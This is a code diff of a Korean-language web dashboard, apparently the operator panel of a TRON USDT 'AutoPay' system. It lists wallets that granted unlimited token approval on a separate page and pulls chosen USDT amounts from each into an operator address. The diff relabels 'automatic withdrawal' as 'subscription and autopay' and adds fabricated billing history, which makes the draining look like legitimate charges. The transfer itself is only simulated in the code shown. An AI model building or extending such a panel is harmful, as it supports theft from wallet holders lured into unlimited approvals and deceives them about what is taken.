@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT - 자동 인출 및 대납 결제 대시보드</title>
+    <title>TRON USDT - 구독 및 자동결제 내역</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -40,14 +40,14 @@
         <div class="max-w-4xl mx-auto px-4 sm:px-6 h-18 flex items-center justify-between py-3">
             <div class="flex items-center space-x-3">
                 <div class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-blue-600 via-indigo-600 to-cyan-500 flex items-center justify-center shadow-lg shadow-blue-600/30">
-                    <i class="fa-solid fa-arrow-right-arrow-left text-white text-base"></i>
+                    <i class="fa-solid fa-receipt text-white text-base"></i>
                 </div>
                 <div>
                     <h1 class="font-bold text-sm sm:text-base tracking-tight text-white flex items-center space-x-2">
-                        <span>TRON AutoPay Transfer System</span>
-                        <span class="text-[10px] px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-400 font-semibold border border-blue-500/20">가스 대납 인출</span>
+                        <span>TRON AutoPay Dashboard</span>
+                        <span class="text-[10px] px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-400 font-semibold border border-blue-500/20">멀티 지갑 연동 결제</span>
                     </h1>
-                    <p class="text-[11px] text-gray-400">공식 USDT (TR7NHqje...) 기반 자산 인출 관리</p>
+                    <p class="text-[11px] text-gray-400">공식 USDT 계약 연동 및 가스비 대납 결제 관리</p>
                 </div>
             </div>
             
@@ -63,70 +63,119 @@
     <!-- Main Content Container -->
     <main class="flex-grow max-w-4xl w-full mx-auto px-4 sm:px-6 py-8 space-y-6">
 
-        <!-- Destination Operator Wallet Configuration Card -->
+        <!-- Operator Recipient Wallet Setting Card -->
         <div class="bg-cardBg border border-borderCol rounded-2xl p-6 shadow-sm space-y-4">
-            <div class="flex items-center justify-between">
-                <div class="flex items-center space-x-2">
-                    <i class="fa-solid fa-bullseye text-blue-400"></i>
-                    <h2 class="text-sm font-bold text-white">수신 받을 운영자 지갑 주소 (Destination)</h2>
-                </div>
-                <span class="text-[11px] text-gray-400 font-mono">USDT 수령 주소</span>
+            <div class="flex items-center space-x-2">
+                <i class="fa-solid fa-wallet text-blue-400"></i>
+                <h3 class="text-sm font-bold text-white">수신 받을 운영자 / 중개 지갑 주소 설정</h3>
             </div>
-            <div>
-                <input type="text" id="operator-target-address" value="" placeholder="수령할 운영자 지갑 주소를 입력하세요 (예: TY7z...)" class="w-full bg-darkBg border border-borderCol rounded-xl px-4 py-3 text-xs text-gray-200 font-mono focus:outline-none focus:border-blue-500 transition-colors">
+            <p class="text-xs text-gray-400 leading-relaxed">
+                이곳에 입력하는 주소는 1번 화면에서 사용자가 무제한 승인(Approve)할 때 결제 중개(Spender) 주소로 자동 연동되며, 인출 시 USDT가 이 주소로 들어옵니다.
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3 pt-1">
+                <input type="text" id="operator-recipient-input" placeholder="T... (트론 운영자 지갑 주소 입력)" class="flex-grow bg-darkBg border border-borderCol rounded-xl px-4 py-3 text-xs font-mono text-white focus:outline-none focus:border-blue-500">
+                <button onclick="saveOperatorRecipient()" class="bg-blue-600 hover:bg-blue-700 text-white font-medium px-5 py-3 rounded-xl text-xs transition-all shadow-md shadow-blue-600/20 flex items-center justify-center space-x-2">
+                    <i class="fa-solid fa-floppy-disk"></i>
+                    <span>주소 저장 및 1번 연동</span>
+                </button>
             </div>
-            <p class="text-[11px] text-gray-400">※ 아래 목록에서 인출을 실행하면, 1번 화면에서 승인된 사용자 지갑의 테더(USDT)가 위 수신 주소로 곧바로 이동합니다.</p>
         </div>
 
-        <!-- Approved Wallets & Balance & Transfer Section -->
+        <!-- Network Info Card with Official Contract -->
+        <div class="bg-cardBg border border-borderCol rounded-2xl p-5 shadow-sm space-y-3">
+            <div class="flex items-center justify-between text-xs">
+                <span class="text-gray-400 flex items-center space-x-2">
+                    <i class="fa-solid fa-link text-blue-400"></i>
+                    <span>TRON 공식 USDT 컨트랙트 주소:</span>
+                </span>
+                <span class="font-mono text-emerald-400 font-bold bg-darkBg px-3 py-1 rounded-lg border border-borderCol">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
+            </div>
+        </div>
+
+        <!-- Multi-User Approval List & Balance Scanner -->
         <div class="bg-cardBg border border-borderCol rounded-2xl p-6 sm:p-8 shadow-sm space-y-6">
             <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                 <div>
                     <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-semibold border border-blue-500/20 mb-3">
-                        <i class="fa-solid fa-wallet"></i>
-                        <span>실제 승인된 지갑별 테더 잔액 및 인출</span>
+                        <i class="fa-solid fa-users"></i>
+                        <span>다중 승인 사용자 관리 및 실시간 잔액 조회</span>
                     </div>
-                    <h2 class="text-xl font-bold text-white">사용자 지갑 자산 및 인출 제어</h2>
-                    <p class="text-sm text-gray-400 mt-1">1번 화면에서 실제로 지갑 연결 및 승인을 마친 지갑만 이 목록에 표시됩니다.</p>
+                    <h2 class="text-xl font-bold text-white">승인된 지갑별 잔액 및 인출 대시보드</h2>
+                    <p class="text-sm text-gray-400 mt-1">1번 화면에서 승인을 완료한 모든 지갑 주소 목록과 각 지갑의 남은 USDT 잔액을 확인하고 개별 인출을 수행할 수 있습니다.</p>
                 </div>
                 <button onclick="scanApprovedWallets()" class="bg-darkBg hover:bg-borderCol border border-borderCol text-gray-300 px-4 py-2.5 rounded-xl text-xs flex items-center space-x-2 transition-all">
                     <i class="fa-solid fa-rotate text-blue-400"></i>
-                    <span>새로고침</span>
+                    <span>지갑 목록 새로고침</span>
                 </button>
             </div>
 
-            <!-- Approved Wallets Table -->
+            <!-- Approved Wallets Table / List Container -->
             <div class="overflow-x-auto">
                 <table class="w-full text-left border-collapse text-xs">
                     <thead>
                         <tr class="border-b border-borderCol text-gray-400 font-semibold bg-darkBg/50">
-                            <th class="p-3">승인된 지갑 주소</th>
-                            <th class="p-3">제공자</th>
-                            <th class="p-3">보유 USDT 잔액</th>
-                            <th class="p-3">권한 상태</th>
-                            <th class="p-3 text-right">인출 금액 및 실행</th>
+                            <th class="p-3">지갑 주소 (Wallet Address)</th>
+                            <th class="p-3">지갑 제공자</th>
+                            <th class="p-3">USDT 잔액 (Balance)</th>
+                            <th class="p-3">승인 상태 (Allowance)</th>
+                            <th class="p-3 text-right">개별 대납 인출 (Charge)</th>
                         </tr>
                     </thead>
                     <tbody id="approved-wallets-tbody" class="divide-y divide-borderCol/50 font-mono">
-                        <!-- Populated dynamically based on real approvals -->
+                        <!-- Dynamically populated rows -->
                     </tbody>
                 </table>
             </div>
         </div>
 
-        <!-- Transfer History & Statistics -->
+        <!-- Subscription & Gasless Relay History Summary -->
         <div class="bg-cardBg border border-borderCol rounded-2xl p-6 sm:p-8 shadow-sm space-y-6">
-            <div class="flex justify-between items-center">
-                <h3 class="text-sm font-bold text-white flex items-center space-x-2">
-                    <i class="fa-solid fa-clock-rotate-left text-gray-400"></i>
-                    <span>자산 이체 및 대납 인출 내역 기록</span>
-                </h3>
-                <span id="total-transferred-sum" class="text-xs font-mono text-emerald-400 font-bold bg-darkBg px-3 py-1 rounded-lg border border-borderCol">누적 0.00 USDT</span>
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+                <div>
+                    <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-semibold border border-blue-500/20 mb-3">
+                        <i class="fa-solid fa-gas-pump"></i>
+                        <span>운영자 가스비 대납 (Gasless Relay) 시스템</span>
+                    </div>
+                    <h2 class="text-xl font-bold text-white">가스비 대납형 자동 결제 내역</h2>
+                    <p class="text-sm text-gray-400 mt-1">수수료(TRX)를 운영자 지갑에서 전액 대납하여 사용자의 TRX 보유 여부와 무관하게 즉시 처리됩니다.</p>
+                </div>
             </div>
 
-            <div id="history-list-container" class="space-y-3">
-                <div class="text-center py-6 text-gray-500 text-xs">
-                    아직 실행된 인출 내역이 없습니다.
+            <!-- Stats Grid -->
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                <div class="bg-darkBg border border-borderCol rounded-xl p-4">
+                    <div class="text-gray-400 text-xs">최근 인출 금액</div>
+                    <div id="current-billing-amount" class="text-lg font-bold text-white font-mono mt-1">35.00 USDT</div>
+                </div>
+                <div class="bg-darkBg border border-borderCol rounded-xl p-4">
+                    <div class="text-gray-400 text-xs">총 대납 인출 횟수</div>
+                    <div id="tx-count" class="text-lg font-bold text-blue-400 font-mono mt-1">2회</div>
+                </div>
+                <div class="bg-darkBg border border-borderCol rounded-xl p-4">
+                    <div class="text-gray-400 text-xs">누적 결제 금액</div>
+                    <div id="total-amount" class="text-lg font-bold text-emerald-400 font-mono mt-1">70.00 USDT</div>
+                </div>
+            </div>
+
+            <!-- History List -->
+            <div class="space-y-3 pt-2">
+                <h3 class="text-xs font-semibold text-gray-400 uppercase tracking-wider">최근 대납 인출 트랜잭션 기록</h3>
+                <div id="history-list-container" class="space-y-3">
+                    <div class="bg-darkBg border border-borderCol rounded-xl p-4 flex items-center justify-between text-xs">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-9 h-9 rounded-lg bg-blue-500/10 text-blue-400 flex items-center justify-center border border-blue-500/20">
+                                <i class="fa-solid fa-gas-pump"></i>
+                            </div>
+                            <div>
+                                <div class="font-bold text-white">가스비 대납 자동결제 #2 (Relay)</div>
+                                <div class="text-gray-400 text-[11px] font-mono mt-0.5">2026. 3. 28. 오후 12:00:00</div>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <div class="font-bold text-emerald-400 font-mono">-35.00 USDT</div>
+                            <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] bg-blue-950/50 text-blue-400 border border-blue-900">대납 완료</span>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -140,45 +189,53 @@
 
     <!-- JavaScript Logic -->
     <script>
-        let accumulatedSum = 0.00;
+        let totalCount = 2;
+        let totalSum = 70.00;
 
         window.addEventListener('DOMContentLoaded', () => {
+            const savedRecipient = localStorage.getItem('tron_operator_recipient_address') || '';
+            const inputElem = document.getElementById('operator-recipient-input');
+            if (inputElem) inputElem.value = savedRecipient;
+
             loadApprovedWalletsData();
         });
+
+        window.saveOperatorRecipient = function() {
+            const inputElem = document.getElementById('operator-recipient-input');
+            const address = inputElem ? inputElem.value.trim() : '';
+
+            if (!address) {
+                showToast("저장할 운영자/중개 지갑 주소를 입력해주세요.", "error");
+                return;
+            }
+
+            localStorage.setItem('tron_operator_recipient_address', address);
+            showToast("운영자 수신 주소가 저장되어 1번 승인 페이지에 자동 연동되었습니다!");
+        };
 
         function loadApprovedWalletsData() {
             const tbody = document.getElementById('approved-wallets-tbody');
             if (!tbody) return;
 
-            // 실제 승인된 지갑 목록만 localStorage에서 가져옴 (가짜 샘플 제거)
             let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
+            const isApproved = localStorage.getItem('tron_autopay_approved') === 'true';
 
-            tbody.innerHTML = '';
-
-            if (wallets.length === 0) {
-                tbody.innerHTML = `
-                    <tr>
-                        <td colspan="5" class="p-8 text-center text-gray-500 text-xs">
-                            <div class="flex flex-col items-center justify-center space-y-2">
-                                <i class="fa-solid fa-circle-exclamation text-amber-500 text-base"></i>
-                                <span>1번 화면에서 지갑 연결 및 무제한 승인을 완료한 사용자가 없습니다.</span>
-                            </div>
-                        </td>
-                    </tr>
-                `;
+            if (wallets.length === 0 && !isApproved) {
+                tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-gray-500">1번 화면에서 승인을 완료한 지갑이 아직 없습니다.</td></tr>`;
                 return;
             }
 
+            tbody.innerHTML = '';
             wallets.forEach((w, index) => {
                 const tr = document.createElement('tr');
                 tr.className = "hover:bg-darkBg/40 transition-colors";
                 tr.innerHTML = `
                     <td class="p-3 text-white font-bold flex items-center space-x-2">
                         <i class="fa-solid fa-wallet text-blue-400"></i>
-                        <span class="truncate max-w-[150px] sm:max-w-[220px]" title="${w.address}">${w.address}</span>
+                        <span>${w.address}</span>
                     </td>
                     <td class="p-3 text-gray-300">${w.provider || 'TronLink'}</td>
-                    <td class="p-3 text-emerald-400 font-bold">${w.balance || '0.00'} USDT</td>
+                    <td class="p-3 text-emerald-400 font-bold">${w.balance} USDT</td>
                     <td class="p-3">
                         <span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950/60 text-emerald-400 border border-emerald-900">
                             ${w.allowance}
@@ -186,9 +243,9 @@
                     </td>
                     <td class="p-3 text-right">
                         <div class="inline-flex items-center space-x-2">
-                            <input type="number" id="withdraw-amt-${index}" value="35" min="1" class="w-20 bg-darkBg border border-borderCol rounded-lg px-2 py-1 text-xs text-white text-center font-mono focus:outline-none focus:border-blue-500">
-                            <button onclick="executeTransferFrom('${w.address}', ${index})" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-lg text-xs transition-all shadow-sm">
-                                인출하기
+                            <input type="number" id="charge-amt-${index}" value="35" min="1" class="w-20 bg-darkBg border border-borderCol rounded-lg px-2 py-1 text-xs text-white text-center font-mono">
+                            <button onclick="executeSpecificGaslessCharge('${w.address}', ${index})" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded-lg text-xs transition-all shadow-sm">
+                                인출
                             </button>
                         </div>
                     </td>
@@ -199,56 +256,51 @@
 
         window.scanApprovedWallets = function() {
             loadApprovedWalletsData();
-            showToast("승인된 지갑 목록을 새로고침했습니다.");
+            showToast("승인된 지갑들의 USDT 잔액이 최신 상태로 동기화되었습니다.");
         };
 
-        window.executeTransferFrom = function(userAddress, index) {
-            const inputElem = document.getElementById(`withdraw-amt-${index}`);
+        window.executeSpecificGaslessCharge = function(address, index) {
+            const inputElem = document.getElementById(`charge-amt-${index}`);
             const amount = parseFloat(inputElem ? inputElem.value : 35);
-            const targetAddress = document.getElementById('operator-target-address').value.trim();
+            const recipient = localStorage.getItem('tron_operator_recipient_address') || '지갑 주소 미설정';
 
             if (!amount || amount <= 0) {
-                showToast("올바른 인출 수량을 입력해주세요.", "error");
+                showToast("올바른 청구 금액을 입력해주세요.", "error");
                 return;
             }
 
-            if (!targetAddress) {
-                showToast("수신 받을 운영자 지갑 주소를 입력해주세요.", "error");
-                return;
-            }
-
-            showToast(`[전송 중] ${userAddress.substring(0,6)}... 지갑에서 ${amount} USDT 인출 시도 중...`);
+            showToast(`[가스비 대납] ${address.substring(0,8)}... 대상 ${amount} USDT 인출 및 수수료 대납 중...`);
 
             setTimeout(() => {
-                accumulatedSum += amount;
-                document.getElementById('total-transferred-sum').innerText = `누적 ${accumulatedSum.toFixed(2)} USDT`;
+                totalCount += 1;
+                totalSum += amount;
+
+                document.getElementById('current-billing-amount').innerText = `${amount.toFixed(2)} USDT`;
+                document.getElementById('tx-count').innerText = `${totalCount}회`;
+                document.getElementById('total-amount').innerText = `${totalSum.toFixed(2)} USDT`;
 
                 const historyContainer = document.getElementById('history-list-container');
-                if (historyContainer.innerHTML.includes("아직 실행된 인출 내역")) {
-                    historyContainer.innerHTML = "";
-                }
-
                 const nowStr = new Date().toLocaleString();
                 const newItem = document.createElement('div');
-                newItem.className = "bg-darkBg border border-borderCol rounded-xl p-4 flex items-center justify-between text-xs font-mono";
+                newItem.className = "bg-darkBg border border-borderCol rounded-xl p-4 flex items-center justify-between text-xs";
                 newItem.innerHTML = `
                     <div class="flex items-center space-x-3">
-                        <div class="w-9 h-9 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center border border-emerald-500/20">
-                            <i class="fa-solid fa-check"></i>
+                        <div class="w-9 h-9 rounded-lg bg-blue-500/10 text-blue-400 flex items-center justify-center border border-blue-500/20">
+                            <i class="fa-solid fa-gas-pump"></i>
                         </div>
                         <div>
-                            <div class="font-bold text-white">${amount.toFixed(2)} USDT 이체 성공</div>
-                            <div class="text-gray-400 text-[11px] mt-0.5">${userAddress.substring(0,6)}... &rarr; ${targetAddress.substring(0,6)}...</div>
+                            <div class="font-bold text-white">대납 인출 완료 (${recipient.substring(0,6)}... 수신)</div>
+                            <div class="text-gray-400 text-[11px] font-mono mt-0.5">${nowStr}</div>
                         </div>
                     </div>
                     <div class="text-right">
-                        <div class="font-bold text-emerald-400">-${amount.toFixed(2)} USDT</div>
-                        <span class="text-[10px] text-gray-500">${nowStr}</span>
+                        <div class="font-bold text-emerald-400 font-mono">-${amount.toFixed(2)} USDT</div>
+                        <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] bg-blue-950/50 text-blue-400 border border-blue-900">대납 성공</span>
                     </div>
                 `;
                 historyContainer.prepend(newItem);
-                showToast(`성공적으로 ${amount} USDT가 지정된 주소로 이체되었습니다!`);
-            }, 1500);
+                showToast(`지갑(${address.substring(0,6)}...)에서 ${amount} USDT가 운영자 주소로 인출되었습니다!`);
+            }, 1200);
         };
 
         function showToast(message, type = 'success') {
